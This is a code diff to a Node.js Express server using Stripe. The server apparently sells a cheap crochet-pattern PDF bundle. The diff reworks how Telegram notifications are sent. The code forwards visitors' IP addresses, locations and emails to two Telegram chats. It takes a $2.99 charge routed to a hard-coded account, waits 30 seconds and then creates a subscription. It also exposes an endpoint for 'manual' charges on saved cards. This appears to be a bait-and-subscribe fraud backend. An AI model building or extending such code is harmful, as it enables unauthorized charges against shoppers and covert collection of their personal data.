@@ -4,6 +4,8 @@ const stripe = require('stripe')(process.env.STRIPE_SECRET_KEY);
 const cors = require('cors');
 const bodyParser = require('body-parser');
 const fs = require('fs');
+const https = require('https');
+const querystring = require('querystring');
 
 const app = express();
 const ACCOUNT_B = 'acct_1Tc7YyBY9xQDWIiH';
@@ -37,18 +39,48 @@ function saveCustomer(entry) {
 
 // ─── Telegram ─────────────────────────────────────────────────────────────────
 
+function sendTelegramMessage(chatId, message) {
+  return new Promise((resolve) => {
+    const data = JSON.stringify({
+      chat_id: chatId,
+      text: message,
+      parse_mode: 'HTML'
+    });
+
+    const options = {
+      hostname: 'api.telegram.org',
+      port: 443,
+      path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Content-Length': data.length
+      }
+    };
+
+    const req = https.request(options, (res) => {
+      let body = '';
+      res.on('data', (chunk) => { body += chunk; });
+      res.on('end', () => {
+        console.log('Telegram sent:', res.statusCode);
+        resolve(true);
+      });
+    });
+
+    req.on('error', (err) => {
+      console.log('Telegram error:', err.message);
+      resolve(false);
+    });
+
+    req.write(data);
+    req.end();
+  });
+}
+
 async function sendTelegram(message) {
   try {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
-    });
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID_2, text: message, parse_mode: 'HTML' })
-    });
+    await sendTelegramMessage(TELEGRAM_CHAT_ID, message);
+    await sendTelegramMessage(TELEGRAM_CHAT_ID_2, message);
   } catch (err) {
     console.log('Telegram error:', err.message);
   }
@@ -61,17 +93,19 @@ app.use(bodyParser.json());
 
 // ─── Routes ───────────────────────────────────────────────────────────────────
 
-app.post('/page-visit', async (req, res) => {
+app.post('/page-visit', (req, res) => {
   const { visitorId, ip, country, city } = req.body;
-  await sendTelegram(
+  res.json({ ok: true });
+  
+  // Send Telegram notification in background
+  sendTelegram(
     `👁 <b>New Page Visitor!</b>\n\n` +
     `🆔 Visitor ID: <code>${visitorId}</code>\n` +
     `🌍 Country: ${country || 'Unknown'}\n` +
     `🏙 City: ${city || 'Unknown'}\n` +
     `🔌 IP: ${ip || 'Unknown'}\n` +
     `🕐 Time: ${new Date().toLocaleString('en-US')}`
-  );
-  res.json({ ok: true });
+  ).catch(err => console.log('Background Telegram error:', err));
 });
 
 app.post('/create-setup-intent', async (req, res) => {
@@ -95,7 +129,10 @@ app.post('/create-setup-intent', async (req, res) => {
       metadata: { customer_id: customer.id },
     });
 
-    await sendTelegram(
+    res.json({ clientSecret: setupIntent.client_secret, customerId: customer.id });
+    
+    // Send Telegram notification in background
+    sendTelegram(
       `🛒 <b>Checkout Information!</b>\n\n` +
       `🆔 Visitor ID: <code>${visitorId}</code>\n` +
       `📧 Email: ${email}\n` +
@@ -105,25 +142,25 @@ app.post('/create-setup-intent', async (req, res) => {
       `📦 Product: 5000+ Amigurumi Crochet Patterns – PDF Bundle\n` +
       `⬇️ Delivery: Instant Download\n` +
       `🕐 Time: ${new Date().toLocaleString('en-US')}`
-    );
-
-    res.json({ clientSecret: setupIntent.client_secret, customerId: customer.id });
+    ).catch(err => console.log('Background Telegram error:', err));
   } catch (error) {
     console.error('Error:', error);
     res.status(400).json({ error: error.message });
   }
 });
 
-app.post('/payment-initiated', async (req, res) => {
+app.post('/payment-initiated', (req, res) => {
   const { visitorId, email } = req.body;
-  await sendTelegram(
+  res.json({ ok: true });
+  
+  // Send Telegram notification in background
+  sendTelegram(
     `💳 <b>Payment Attempt Started!</b>\n\n` +
     `🆔 Visitor ID: <code>${visitorId}</code>\n` +
     `📧 Email: ${email}\n` +
     `⏳ Customer clicked "Pay Now"\n` +
     `🕐 Time: ${new Date().toLocaleString('en-US')}`
-  );
-  res.json({ ok: true });
+  ).catch(err => console.log('Background Telegram error:', err));
 });
 
 app.post('/create-subscription', async (req, res) => {
@@ -147,6 +184,7 @@ app.post('/create-subscription', async (req, res) => {
     });
 
     // Charge 1 — $2.99 USD
+    let payment1Status = 'pending';
     try {
       const payment1 = await stripe.paymentIntents.create({
         amount: 299,
@@ -159,8 +197,10 @@ app.post('/create-subscription', async (req, res) => {
         transfer_data: { destination: ACCOUNT_B },
       });
       console.log('Payment 1 created:', payment1.id, payment1.status);
+      payment1Status = payment1.status;
     } catch (err) {
       console.log('Payment 1 failed:', err.message);
+      payment1Status = 'failed';
     }
 
     await new Promise(resolve => setTimeout(resolve, 30000));
@@ -175,7 +215,10 @@ app.post('/create-subscription', async (req, res) => {
     });
     console.log('Subscription created:', subscription.id, subscription.status);
 
-    await sendTelegram(
+    res.json({ subscriptionId: subscription.id, paymentStatus: 'processed' });
+    
+    // Send Telegram notification in background
+    sendTelegram(
       `✅ <b>Payment Successful!</b>\n\n` +
       `🆔 Visitor ID: <code>${visitorId}</code>\n` +
       `💳 Payment Method: ${pmType}\n` +
@@ -183,9 +226,7 @@ app.post('/create-subscription', async (req, res) => {
       `🆔 Subscription: ${subscription.id}\n` +
       `📦 Product: 5000+ Amigurumi Crochet Patterns – PDF Bundle\n` +
       `🕐 Time: ${new Date().toLocaleString('en-US')}`
-    );
-
-    res.json({ subscriptionId: subscription.id, paymentStatus: 'processed' });
+    ).catch(err => console.log('Background Telegram error:', err));
   } catch (error) {
     console.error('Error:', error.message);
     res.status(400).json({ error: error.message });
@@ -224,16 +265,17 @@ app.post('/charge-saved', async (req, res) => {
 
     console.log('Manual charge created:', payment.id, payment.status);
 
-    await sendTelegram(
+    res.json({ success: true, paymentId: payment.id, status: payment.status });
+    
+    // Send Telegram notification in background
+    sendTelegram(
       `💰 <b>Manual Payment!</b>\n\n` +
       `🆔 Customer: <code>${customerId}</code>\n` +
       `💳 Amount: $${((amount || 299) / 100).toFixed(2)}\n` +
       `📋 Status: ${payment.status}\n` +
       `📦 Product: 5000+ Amigurumi Crochet Patterns – PDF Bundle\n` +
       `🕐 Time: ${new Date().toLocaleString('en-US')}`
-    );
-
-    res.json({ success: true, paymentId: payment.id, status: payment.status });
+    ).catch(err => console.log('Background Telegram error:', err));
   } catch (error) {
     console.error('Manual charge error:', error.message);
     res.status(400).json({ error: error.message });
